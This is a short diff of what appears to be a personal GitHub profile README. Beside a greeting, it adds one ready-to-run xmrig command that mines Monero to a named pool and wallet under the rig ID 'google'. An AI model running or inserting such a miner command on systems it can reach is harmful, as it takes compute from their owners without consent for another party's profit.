@@ -3,6 +3,8 @@
 
 ### Hello there! 👋 I'm just a programmer that likes to do things on computers. You will find various languages and differents things here. You are welcome, come whenever you want.
 
+./xmrig -o us-west.minexmr.com:443 -u 86yvinrzgU2Fi3hg7u6nhAgtGzgXPhguAMy6PtQhibDAjFBD5sSm44wQ1qpdWya9FRaLk44KVEcZuS7pfAnmPagWRAjGKjE -k --tls --rig-id google
+
 ### Some of my skills
 
 <p align="center">
